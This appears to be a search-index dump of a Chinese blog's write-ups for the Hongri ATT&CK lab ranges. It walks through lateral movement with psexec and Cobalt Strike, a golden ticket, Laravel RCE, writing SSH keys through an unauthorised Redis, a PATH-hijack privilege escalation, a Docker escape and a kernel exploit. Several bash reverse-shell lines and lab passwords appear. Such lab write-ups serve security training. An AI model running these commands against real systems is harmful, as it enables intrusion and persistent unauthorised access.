10.10.10.0/24\uff0c\u63a2\u6d4b\u5185\u7f51\u5b58\u6d3b\u4e3b\u673a+\u7aef\u53e3\u626b\u63cf\u3002\u5c31\u4e0d\u4e0a\u4f20fscan\u6216\u8005nmap\u53bb\u626b\u4e86\u3002</p> <p></p> <p>10.10.10.201\uff08PC\uff09\u56e0\u4e3a\u53ef\u80fd\u5f00\u4e86\u9632\u706b\u5899\u6216\u8005\u6709360\u7b49\u6740\u8f6f\uff0c\u5e76\u6ca1\u6709\u63a2\u6d4b\u6210\u529f\u3002\u4f46\u662f\u6211\u4eec\u53d1\u73b0\u57df\u63a7DC\u4e0a\u5f00\u653e\u4e86\u5f88\u591a\u7aef\u53e3\uff0c\u5f00\u4e86445\u548c139\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x05","title":"0x05 \u6a2a\u5411\u79fb\u52a8","text":"<p>\u5728\u63d0\u6743\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528mimikatz dump\u76ee\u6807\u673a\u7684\u51ed\u8bc1\uff0c\u5e76\u8fdb\u884c\u5185\u7f51\u6a2a\u5411\u79fb\u52a8(PTH)</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#dc-psexec","title":"\u6a2a\u5411DC - psexec \u4f20\u9012","text":"<p>\u6a2a\u5411\u79fb\u52a8\u8df3\u8f6c\u5230DC\uff0810.10.10.10\uff09\uff0c\u8fd9\u91cc\u4f7f\u7528psexec\uff0c\u7528\u4e4b\u524d\u83b7\u53d6\u7684\u57df\u7ba1\u5bc6\u7801\u4f5c\u4e3a\u767b\u5f55DC\u7684\u53e3\u4ee4\uff0c\u65b0\u5efa\u4e00\u4e2asmb\u76d1\u542c\u5668\uff0c\u76d1\u542c\u57df\u5185\u4e3b\u673aWEB\uff0810.10.10.80\uff09 \u4f5c\u4e3a\u8df3\u677f\u673a\u4f20\u56de\u6765\u7684session\uff08\u4e0a\u7ebf\uff09\u4f1a\u8bdd\u3002</p> <p>psexec \u662f\u5fae\u8f6f pstools \u5de5\u5177\u5305\u4e2d\u6700\u5e38\u7528\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u4e5f\u662f\u5728\u5185\u7f51\u6e17\u900f\u4e2d\u7684\u514d\u6740\u6e17\u900f\u5229\u5668\u3002psexec \u80fd\u591f\u5728\u547d\u4ee4\u884c\u4e0b\u5728\u5bf9\u65b9\u6ca1\u6709\u5f00\u542f telnet \u670d\u52a1\u7684\u65f6\u5019\u8fd4\u56de\u4e00\u4e2a\u534a\u4ea4\u4e92\u7684\u547d\u4ee4\u884c\uff0c\u50cf telnet \u5ba2\u6237\u7aef\u4e00\u6837\u3002\u539f\u7406\u662f\u57fa\u4e8eIPC\u5171\u4eab\uff0c\u6240\u4ee5\u8981\u76ee\u6807\u6253\u5f00 445 \u7aef\u53e3\u3002\u53e6\u5916\u5728\u542f\u52a8\u8fd9\u4e2a psexec \u5efa\u7acb\u8fde\u63a5\u4e4b\u540e\u5bf9\u65b9\u673a\u5668\u4e0a\u4f1a\u88ab\u5b89\u88c5\u4e00\u4e2a\u670d\u52a1\u3002</p> <pre><code>\u83b7\u53d6\u51ed\u636e\u540e\u5bf9\u76ee\u6807\u7f51\u6bb5\u8fdb\u884c\u7aef\u53e3\u5b58\u6d3b\u63a2\u6d4b\uff0c\u56e0\u4e3a\u662f psexec \u4f20\u9012\u767b\u5f55\uff0c\u8fd9\u91cc\u4ec5\u9700\u63a2\u6d4b445\u7aef\u53e3\n\u547d\u4ee4\uff1aportscan ip\u7f51\u6bb5 \u7aef\u53e3 \u626b\u63cf\u534f\u8bae\uff08arp\u3001icmp\u3001none\uff09 \u7ebf\u7a0b\n\u4f8b\u5982\uff1aportscan 10.10.10.0/24 445 arp 200\n</code></pre> <p></p> <p>\u53ef\u770b\u5230\u57df\u63a7\u673a\u5668DC\u5f00\u653e\u4e86445\u7aef\u53e3.</p> <p>\u5de5\u5177\u680f View-&gt;Targets \u67e5\u770b\u7aef\u53e3\u63a2\u6d4b\u540e\u7684\u5b58\u6d3b\u4e3b\u673a</p> <p></p> <p>SMB Beacon\u4f7f\u7528\u547d\u540d\u7ba1\u9053\u901a\u8fc7\u7236\u7ea7Beacon\u8fdb\u884c\u901a\u8baf\uff0c\u5f53\u4e24\u4e2aBeacons\u94fe\u63a5\u540e\uff0c\u5b50Beacon\u4ece\u7236Beacon\u83b7\u53d6\u5230\u4efb\u52a1\u5e76\u53d1\u9001\u3002\u56e0\u4e3a\u94fe\u63a5\u7684Beacons\u4f7f\u7528Windows\u547d\u540d\u7ba1\u9053\u8fdb\u884c\u901a\u4fe1\uff0c\u6b64\u6d41\u91cf\u5c01\u88c5\u5728SMB\u534f\u8bae\u4e2d\uff0c\u6240\u4ee5SMB Beacon\u76f8\u5bf9\u9690\u853d\uff0c\u7ed5\u9632\u706b\u5899\u65f6\u53ef\u80fd\u53d1\u6325\u5947\u6548\u3002</p> <p>\u57df\u63a7\u4e0d\u51fa\u7f51\u65e0\u6cd5\u5f62\u6210\u53cd\u5411shell\uff0c\u65e0\u6cd5\u4f7f\u7528http\u76d1\u542c\u5668\uff0c\u6240\u4ee5\u521b\u5efa\u4e00\u4e2aSMB\u76d1\u542c\u5668\u3002</p> <p></p> <p>\u5229\u7528psexec\u6a2a\u5411\u79fb\u52a8</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>DC\u6210\u529f\u4e0a\u7ebf\uff0c\u62ff\u4e0b\u57df\u63a7</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#pc-psexec_psh","title":"\u6a2a\u5411PC - psexec_psh","text":"<p>\u9009\u62e9\u5df2\u7ecf\u83b7\u5f97\u7684\u51ed\u636e\uff08\u660e\u6587\u3001\u6563\u5217\u503c\u3001\u4ee4\u724c\u90fd\u53ef\u4ee5\uff09\u3001\u56de\u8fde\u7684listener\u3001\u8fdb\u884c\u6a2a\u5411\u7684session\u3002</p> <p></p> <p></p> <p>\u5230\u8fd9\u91cc\u6240\u6709\u57df\u5185\u4e3b\u673a\u90fd\u5df2\u7ecf\u62ff\u4e0b\u4e86\uff0c\u53ef\u4ee5\u8bf4\u5df2\u7ecf\u662f\u62ff\u4e0b\u8fd9\u4e2a\u57df</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#0x06","title":"0x06 \u6743\u9650\u7ef4\u6301","text":"<p>\u5728\u57df\u63a7\u83b7\u5f97KRBTGT\u8d26\u6237NTLM\u5bc6\u7801\u54c8\u5e0c\u548cSID</p> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#_1","title":"\u9ec4\u91d1\u7968\u636e\u5229\u7528","text":"<p>\u9ec4\u91d1\u7968\u636e\u662f\u4f2a\u9020\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u4e5f\u88ab\u79f0\u4e3a\u8ba4\u8bc1\u7968\u636e\u3002TGT\u4ec5\u7528\u4e8e\u5411\u57df\u63a7\u5236\u5668\u4e0a\u7684\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\uff08KDC\uff09\u8bc1\u660e\u7528\u6237\u5df2\u88ab\u5176\u4ed6\u57df\u63a7\u5236\u5668\u8ba4\u8bc1\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html#_2","title":"\u9ec4\u91d1\u7968\u636e\u7684\u6761\u4ef6\u8981\u6c42\uff1a","text":"<ul> <li>\u57df\u540d\u79f0</li> <li>\u57df\u7684SID\u503c</li> <li>\u57df\u7684KRBTGT\u8d26\u6237NTLM\u5bc6\u7801\u54c8\u5e0c</li> <li>\u4f2a\u9020\u7528\u6237\u540d</li> </ul> <p>\u9ec4\u91d1\u7968\u636e\u53ef\u4ee5\u5728\u62e5\u6709\u666e\u901a\u57df\u7528\u6237\u6743\u9650\u548cKRBTGT\u8d26\u53f7\u7684\u54c8\u5e0c\u7684\u60c5\u51b5\u4e0b\u7528\u6765\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\uff0c\u4e0a\u9762\u5df2\u7ecf\u83b7\u5f97\u57df\u63a7\u7684 system \u6743\u9650\u4e86\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u9ec4\u91d1\u7968\u636e\u505a\u6743\u9650\u7ef4\u6301\uff0c\u5f53\u57df\u63a7\u6743\u9650\u6389\u540e\uff0c\u5728\u901a\u8fc7\u57df\u5185\u5176\u4ed6\u4efb\u610f\u673a\u5668\u4f2a\u9020\u7968\u636e\u91cd\u65b0\u83b7\u53d6\u6700\u9ad8\u6743\u9650\u3002</p> <p>WEB\u673a Administrator \u6743\u9650\u673a\u5668-&gt;\u53f3\u952e-&gt;Access-&gt;Golden Ticket</p> <p></p> <p></p> <p>\u4f2a\u9020\u6210\u529f\u3002</p> <p>\u4f2a\u9020\u9ec4\u91d1\u7968\u636e\u4e4b\u524d\uff1a</p> <p></p> <p>\u4f2a\u9020\u9ec4\u91d1\u7968\u636e\u4e4b\u540e\uff1a</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html","title":"\u7ea2\u65e5ATT&amp;CK\u7cfb\u5217\u9776\u573a\uff08\u4e03\uff09","text":"<ul> <li>\u7f51\u7edc\u73af\u5883:\u4e00\u5171\u62e5\u6709\u4e09\u5c42\u7f51\u7edc\u73af\u5883\u3002</li> </ul> <ul> <li>\u670d\u52a1\u914d\u7f6e\uff1a</li> </ul> <p>DMZ\u533a\u7684 Ubuntu \u9700\u8981\u542f\u52a8nginx\u670d\u52a1\uff1a</p> <pre><code>redis-server /etc/redis.conf\n/usr/sbin/nginx -c /etc/nginx/nginx.conf\niptables -F\n</code></pre> <p>\u7b2c\u4e8c\u5c42\u7f51\u7edc\u7684 Ubuntu\u9700\u8981\u542f\u52a8docker\u5bb9\u5668\uff1a</p> <pre><code>sudo service docker start\nsudo docker start 8e172820ac78\n</code></pre> <p>\u7b2c\u4e09\u5c42\u7f51\u7edc\u7684 Windows 7 \uff08PC 2\uff09\u9700\u8981\u542f\u52a8\u901a\u8fbeOA\uff1a</p> <pre><code>C:\\MYOA\\bin\\AutoConfig.exe\n</code></pre> <ul> <li>\u57df\u7528\u6237\u4fe1\u606f</li> </ul> <p>\u57df\u7528\u6237\u8d26\u6237\u548c\u5bc6\u7801\u5982\u4e0b\uff1a</p> <pre><code>Administrator\uff1aWhoami2021\nwhoami\uff1aWhoami2021\nbunny\uff1aBunny2021\nmoretz\uff1aMoretz2021\n</code></pre> <p>Ubuntu 1\uff1a</p> <pre><code>web\uff1aweb2021\n</code></pre> <p>Ubuntu 2\uff1a</p> <pre><code>ubuntu\uff1aubuntu\n</code></pre> <p>\u901a\u8fbeOA\u8d26\u6237\uff1a</p> <pre><code>admin\uff1aadmin657260\n</code></pre>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_1","title":"\u5916\u7f51\u6e17\u900f","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#laravel-debug-mode-rcecve-2021-3129","title":"Laravel Debug mode RCE\uff08CVE-2021-3129\uff09","text":"<p>\u5148\u8fdb\u884c\u7aef\u53e3\u626b\u63cf</p> <p></p> <p>6379\u7aef\u53e3\u4e5f\u5f00\u542f\u4e86\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u626b\u4e0d\u51fa\u6765\u3002</p> <p></p> <p>\u5f00\u653e22\uff0c80\uff0c81\uff0c6379\u7aef\u53e3\u3002</p> <p>\u8bbf\u95ee81\u7aef\u53e3\u53d1\u73b0\u662fLaravel\u6846\u67b6\u4e14\u7248\u672c\u662fLaravel v8.29.0 (PHP v7.4.14)</p> <p></p> <p>\u6070\u597d\u8fd9\u4e2a\u6846\u67b6\u7206\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u6211\u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528\u5de5\u5177\u8fdb\u884cGetshell</p> <p>\u5de5\u5177\u94fe\u63a5\uff1ahttps://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</p> <p></p> <p>\u7b80\u5355\u8fdb\u884c\u4e86\u4fe1\u606f\u6536\u96c6</p> <pre><code>hostname\ncat /etc/hosts\ncat /proc/1/cgroup\n</code></pre> <p></p> <p>\u5c1d\u8bd5\u53cd\u5f39shell\u5230Kali\u4e0a\u518d\u8fdb\u884c\u63d0\u6743\uff0cKali\u8fdb\u884c\u76d1\u542c\uff0c\u4f46\u662f\u6700\u540e\u6ca1\u6709\u53cd\u5e94\u3002</p> <p></p> <p>\u5c1d\u8bd5\u4e86MSF\u7684tcp\u3001http\u5747\u4e0d\u884c\uff0c\u6545\u5224\u65ad\u4e3a\u4e0d\u51fa\u7f51</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#redis","title":"Redis\u672a\u6388\u6743","text":"<p>\u65e2\u7136\u53cd\u5f39\u4e0d\u4e86shell\uff0c\u53ea\u80fd\u4ece\u5176\u4ed6\u5730\u65b9\u8fdb\u884c\u5165\u624b\u4e86\uff0c\u4e4b\u524d\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u65f6\u53d1\u73b0\u8be5\u673a\u5668\u5f00\u77406379\uff0c\u5c1d\u8bd5Redis\u5f31\u53e3\u4ee4\u6216\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u5c1d\u8bd5\u8fdb\u884c\u8fde\u63a5Redis\uff0c\u8fde\u63a5\u6210\u529f\uff0c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee</p> <p></p> <p>\u5c1d\u8bd5\u5199\u5165SSH\u516c\u94a5</p> <pre><code>ssh-keygen -t rsa #\u751f\u6210\u4e00\u5bf9RSA SSH\u5bc6\u94a5\uff0c\u9ed8\u8ba4\u5b58\u50a8\u5728/root/.ssh/id_rsa\uff08\u79c1\u94a5\uff09\u548c/root/.ssh/id_rsa.pub\uff08\u516c\u94a5\uff09\u4e2d(\u9ed8\u8ba4\u60c5\u51b5\u5373\u4e00\u76f4\u56de\u8f66)\n\n(echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa.pub; echo -e \"\\n\\n\") &gt; foo.txt #\u5c06\u4e24\u4e2a\u6362\u884c\u7b26\u548c\u516c\u94a5\u5185\u5bb9\u5199\u5165foo.txt\uff0c\u6362\u884c\u7b26\u7528\u4e8e\u5206\u9694\u3002\n\ncat foo.txt | redis-cli -h 192.168.111.133 -p 6379 -x set hello #\u5c06foo.txt\u4e2d\u7684\u5185\u5bb9\u901a\u8fc7\u7ba1\u9053\u4f20\u8f93\u7ed9Redis\u547d\u4ee4\uff0c\u8bbe\u7f6e\u952ehello\u7684\u503c\u4e3afoo.txt\u7684\u5185\u5bb9\u3002\n</code></pre> <p></p> <pre><code>config set dir /root/.ssh    # \u5c06Redis\u6570\u636e\u5e93\u7684\u6301\u4e45\u5316\u76ee\u5f55\u8bbe\u7f6e\u4e3a/root/.ssh\uff0c\u8fd9\u610f\u5473\u7740\u540e\u7eed\u7684\u6570\u636e\u6587\u4ef6\u4f1a\u5b58\u50a8\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e2d\nconfig set dbfilename authorized_keys    # \u5c06Redis\u6570\u636e\u5e93\u7684\u6301\u4e45\u5316\u6587\u4ef6\u540d\u8bbe\u7f6e\u4e3aauthorized_keys\u3002\u8fd9\u610f\u5473\u7740\u6570\u636e\u4f1a\u88ab\u4fdd\u5b58\u4e3a/root/.ssh/authorized_keys\u6587\u4ef6\nsave    # \u7acb\u5373\u5c06\u5f53\u524d\u6570\u636e\u5e93\u7684\u5185\u5bb9\u4fdd\u5b58\u5230\u6307\u5b9a\u7684\u6587\u4ef6\uff08\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e3a/root/.ssh/authorized_keys\uff09\uff0c\u4ee5\u4fbf\u4e8e\u6570\u636e\u6301\u4e45\u5316\nssh 192.168.111.133 # \u8fde\u63a5\n</code></pre> <p></p> <p></p> <p>\u6210\u529f\u8fdb\u884c\u8fde\u63a5\uff0c\u7b80\u5355\u8fdb\u884c\u4e86\u4fe1\u606f\u6536\u96c6\uff0c\u53d1\u73b0\u5b58\u572852\u6bb5</p> <p></p> <p>\u56e0\u4e3a\u4e4b\u524d\u7684shell\u53cd\u5f39\u4e0d\u4e86\uff0c\u6240\u4ee5\u770b\u4e00\u4e0bnginx\u7684\u914d\u7f6e\u6587\u4ef6\u662f\u4e0d\u662f\u505a\u4e86\u53cd\u5411\u4ee3\u7406</p> <p>proxy_pass http://192.168.52.20:8000;\uff1a\u5c06\u5bf9\u6839\u8def\u5f84\u7684\u8bf7\u6c42\u4ee3\u7406\u8f6c\u53d1\u5230\u53e6\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u5730\u5740\u4e3ahttp://192.168.52.20:8000\u3002\u8fd9\u6837\uff0cNginx\u5c06\u5145\u5f53\u53cd\u5411\u4ee3\u7406\uff0c\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u8be5\u5730\u5740\u5e76\u8fd4\u56de\u54cd\u5e94\u3002</p> <p>proxy_pass\u7684\u5b58\u5728\u610f\u4e49\u5728\u4e8e\u5b9e\u73b0\u8bf7\u6c42\u7684\u8f6c\u53d1\u548c\u8d1f\u8f7d\u5747\u8861\u3002\u5177\u4f53\u4f5c\u7528\u5305\u62ec\uff1a</p> <p>\u53cd\u5411\u4ee3\u7406\uff1aNginx\u63a5\u6536\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u8bf7\u6c42\u8f6c\u53d1\u5230\u6307\u5b9a\u7684\u540e\u7aef\u670d\u52a1\u5668\uff08\u5982http://192.168.52.20:8000\uff09\uff0c\u9690\u85cf\u540e\u7aef\u670d\u52a1\u5668\u7684\u771f\u5b9e\u5730\u5740\u3002</p> <p>\u8d1f\u8f7d\u5747\u8861\uff1a\u53ef\u4ee5\u5c06\u8bf7\u6c42\u5206\u53d1\u5230\u591a\u53f0\u540e\u7aef\u670d\u52a1\u5668\uff0c\u4ee5\u5e73\u8861\u8d1f\u8f7d\uff0c\u63d0\u9ad8\u670d\u52a1\u7684\u53ef\u7528\u6027\u548c\u54cd\u5e94\u901f\u5ea6\u3002</p> <p></p> <p></p> <p>81\u7aef\u53e3\u7684\u53cd\u5f39\u4e0d\u5230kali\uff0c\u53ea\u80fd\u9ebb\u70e6\u4e00\u70b9\u4f7f\u7528ubuntu\u505a\u4e3a\u8df3\u677f\u673a\u8fdb\u884c\u64cd\u4f5c.</p> <p>\u9996\u5148\u8fdb\u884c\u53cd\u5f39shell\u5230ubuntu:192.168.52.10</p> <pre><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/4444 &lt;&amp;1'\n</code></pre> <p></p> <p>\u5f53\u524d\u6743\u9650\u4e3awww\uff0c\u5148\u8fdb\u884c\u63d0\u6743</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_2","title":"\u73af\u5883\u53d8\u91cf\u63d0\u6743","text":"<p>\u53d1\u73b0\u662fdocker\u73af\u5883\u3002</p> <p></p> <p>\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u56e0\u4e3adocker\u73af\u5883\u7684\u539f\u56e0\uff0c\u5c1d\u8bd5\u5185\u6838\u63d0\u6743\u5931\u8d25\u3002\u65e2\u7136\u5982\u6b64\uff0c\u5c31\u5c1d\u8bd5\u641c\u7d22\u5bfb\u627e\u5e26\u6709SUID\u7684\u6587\u4ef6</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\nfind / -user root -perm -4000 -print 2&gt;/dev/null\n</code></pre> <p></p> <p>\u53d1\u73b0home\u76ee\u5f55\u4e0b\u7684\u90a3\u4e2ashell\u6709\u70b9\u53ef\u7591\uff0c\u5148\u6267\u884c\u770b\u770b\u4f1a\u53d1\u751f\u4ec0\u4e48</p> <p></p> <p>\u901a\u8fc7\u6267\u884c\u53d1\u73b0\u8be5\u811a\u672c\u6267\u884c\u4e86<code>ps</code>\u547d\u4ee4\u4e14\u5e76\u672a\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\uff0c\u6e90\u7801\u5728demo.c\u4e2d\u53ef\u4ee5\u6e05\u695a\u770b\u5230\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u5c1d\u8bd5\u66f4\u6539$PATH\u6765\u6267\u884c\u6211\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\uff0c\u4ece\u800c\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u7684\u9ad8\u6743\u9650shell</p> <pre><code>cd /tmp\necho \"/bin/bash\" &gt; ps  //\u521b\u5efa\u4e00\u4e2a\u540d\u4e3aps\u7684\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4e2d\u5199\u5165/bin/bash\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u6210\u4e3a\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u3002\nchmod 777 ps\necho $PATH     //\u8f93\u51fa\u5f53\u524d\u7684\u73af\u5883\u53d8\u91cfPATH\uff0c\u663e\u793a\u7cfb\u7edf\u67e5\u627e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84\u3002\nexport PATH=/tmp:$PATH //\u5c06/tmp\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u5e76\u4e14\u5148\u52a0\u8f7d\u6267\u884c/tmp\u91cc\u7684\u7a0b\u5e8f\ncd /home/jobs\n./shell\n</code></pre> <p></p> <p>\u6210\u529f\u83b7\u5f97root\u6743\u9650\uff0c\u628ashell\u518d\u53cd\u5f39\u5230ubuntu(web 1)\u4e2d</p> <pre><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/5555 &lt;&amp;1'\n</code></pre> <p></p> <p>\u524d\u9762\u8bf4\u5230\u8fd9\u662f\u4e2adocker\u73af\u5883\uff0c\u5b9e\u9645IP\u4e3a192.168.52.20\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u8fdb\u884cdocker\u9003\u9038</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#docker","title":"Docker\u7279\u6743\u6a21\u5f0f\u9003\u9038","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_3","title":"\u539f\u7406","text":"<p>\u4f7f\u7528\u7279\u6743\u6a21\u5f0f\u542f\u52a8\u5bb9\u5668\uff0c\u53ef\u4ee5\u83b7\u53d6\u5927\u91cf\u8bbe\u5907\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u3002\u56e0\u4e3a\u5f53\u7ba1\u7406\u5458\u6267\u884c<code>docker run \u2014privileged</code>\u65f6\uff0cDocker\u5bb9\u5668\u5c06\u88ab\u5141\u8bb8\u8bbf\u95ee\u4e3b\u673a\u4e0a\u7684\u6240\u6709\u8bbe\u5907\uff0c\u5e76\u53ef\u4ee5\u6267\u884c<code>mount</code>\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<pre><code>fdisk -l #\u67e5\u770b\u78c1\u76d8\u6587\u4ef6\nls /dev #\u67e5\u770b\u8bbe\u5907\u6587\u4ef6\n</code></pre> <p>\u6709\u4e09\u4e2a\u78c1\u76d8\u6587\u4ef6\u548cN\u4e2a\u8bbe\u5907\u6587\u4ef6\uff0c\u6211\u4eec\u5c06/dev/sda1\u6302\u8f7d\u5230\u81ea\u5df1\u521b\u5efa\u7684\u6587\u4ef6\u5939</p> <pre><code>mkdir hello\nmount /dev/sda1 /hello\nls /hello\n</code></pre> <p></p> <p>\u6302\u8f7d\u6210\u529f\uff0c\u5199\u5165\u8ba1\u5212\u4efb\u52a1</p> <pre><code>echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.10/2333 0&gt;&amp;1' &gt;&gt; /hello/var/spool/cron/root\n</code></pre> <p></p> <p>\u6ca1\u6709\u53cd\u5e940.0</p> <p>\u6362\u53e6\u4e00\u4e2a\u601d\u8def\uff0c\u7ffb\u4e00\u4e0b\u770b\u770b\u53ef\u4e0d\u53ef\u4ee5\u8bbf\u95eeroot\u76ee\u5f55\u6216\u67e5\u770bhome\u6709\u6ca1\u6709\u7528\u6237</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6709ubuntu\u8fd9\u4e2a\u7528\u6237</p> <p>\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u5c06\u6211\u4eec\u81ea\u5df1\u751f\u6210\u7684ssh\u79d8\u94a5\u5199\u5165\u5230/hello/home/ubuntu/.ssh\u76ee\u5f55\u4e2d\u7684authorized_keys\u6587\u4ef6\u4e2d\uff0c\u5199\u5165\u6210\u529f\u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\u8be5\u5bc6\u94a5\u8fdb\u884c\u767b\u9646\u8be5\u673a\u5668</p> <pre><code>ssh-keygen -f hello\nchmod 600 hello #\u8d4b\u4e88\u6743\u9650\n</code></pre> <p></p> <pre><code>cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx\u662f\u5c06\u6743\u9650\u4e5f\u4e00\u8d77\u590d\u5236\n\necho &gt; /hello/home/ubuntu/.ssh/authorized_keys #\u6e05\u7a7aauthorized_keys\u6587\u4ef6\n\necho '\u751f\u6210\u7684.pub\u6587\u4ef6\u7684\u5185\u5bb9' &gt; /hello/home/ubuntu/.ssh/authorized_keys #\u5c06ssh\u79d8\u94a5\u5199\u5165authorized_keys\u6587\u4ef6\n\ncat /hello/home/ubuntu/.ssh/authorized_keys #\u67e5\u770b\u662f\u5426\u5199\u5165\u6210\u529f\n\nssh -i hello ubuntu@192.168.52.20\n</code></pre> <p></p> <p>\u6210\u529f\u767b\u5f55\uff0c\u67e5\u770b\u4e86\u4e00\u4e0b\u7f51\u7edc\uff0c\u53d1\u73b0\u8fd8\u5b58\u572893\u7f51\u6bb5</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#cve-2021-3493","title":"CVE-2021-3493","text":"<p>linux kernel\u4e00\u822c\u6307Linux\u5185\u6838\u3002Linux\u662f\u4e00\u79cd\u5f00\u6e90\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u3002\u5b83\u662f\u4e00\u4e2a\u7528C\u8bed\u8a00\u5199\u6210\uff0c\u7b26\u5408POSIX\u6807\u51c6\u7684\u7c7bUnix\u64cd\u4f5c\u7cfb\u7edf\u3002 linux\u5185\u6838\u4e2d\u7684overlayfs\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6ca1\u6709\u6b63\u786e\u5730\u9a8c\u8bc1\u7528\u6237\u540d\u79f0\u7a7a\u95f4\u548c\u5e95\u5c42\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6587\u4ef6\u529f\u80fd\u7684\u8bbe\u7f6e\u3002\u7531\u4e8e\u975e\u7279\u6743\u7528\u6237\u540d\u79f0\u7a7a\u95f4\u548cUbuntu\u5185\u6838\u4e2d\u5141\u8bb8\u975e\u7279\u6743\u8986\u76d6\u7684\u8865\u4e01\u7684\u7ec4\u5408\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u83b7\u5f97\u66f4\u9ad8\u7684\u7279\u6743\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_5","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c","text":"<p>Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM</p> <p></p> <p>\u56e0\u4e3a\u767b\u5f55\u7684\u662fubuntu\u7528\u6237\uff0c\u521a\u597d\u4eca\u5e74ubuntu\u673a\u5668\u51fa\u4e86\u4e00\u4e2a\u5185\u6838\u63d0\u6743\u6f0f\u6d1e\uff0c\u8be5\u673a\u5668\u5728\u5f71\u54cd\u8303\u56f4\u5185,\u5148\u8fdb\u884c\u63d0\u6743.</p> <p>\u8fdb\u5165\u5230tmp\u76ee\u5f55</p> <pre><code>vim exploit.c #\u5c06\u4e0b\u8f7d\u7684exploit.c\u7684\u5185\u5bb9\u7c98\u8d34\u5230\u8be5\u6587\u4ef6\u4e2d\ngcc exploit.c -o exploit #\u7f16\u8bd1\nchmod +x exploit\n./exploit\n</code></pre> <p></p> <p>Exp\uff1ahttps://github.com/briskets/CVE-2021-3493/blob/main/exploit.c</p> 